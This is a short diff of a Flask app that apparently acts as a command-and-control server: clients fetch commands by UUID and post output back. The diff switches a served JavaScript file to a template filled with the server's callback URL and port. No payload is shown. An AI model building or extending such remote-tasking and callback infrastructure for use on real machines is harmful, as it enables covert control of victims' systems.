@@ -1,4 +1,4 @@
-from flask import render_template, request, send_from_directory
+from flask import render_template, request
 from app import app, db
 from .models import Client, Command
 from .preflight_scripts import pf_scripts
@@ -55,8 +55,8 @@ def get_command(client_uuid):
 def post_back():
     if request.method == 'POST':
         client_id = request.form.get('uuid', '')
-        cmd_id = request.form.get('cmd_id', '')
-        output = request.form.get('output', '')
+        cmd_id    = request.form.get('cmd_id', '')
+        output    = request.form.get('output', '')
 
         if client_id and cmd_id:
             c = Command.query.filter_by(id=cmd_id).first()
@@ -67,6 +67,9 @@ def post_back():
 
         return '200'
 
-@app.route('/jss')
+
+@app.route('/js')
 def get_js_file():
-    return send_from_directory('static', filename='js/ugly.js')
+    return render_template('jss_template.js',
+                           url = app.config.get('URL'),
+                           port = app.config.get('PORT'))
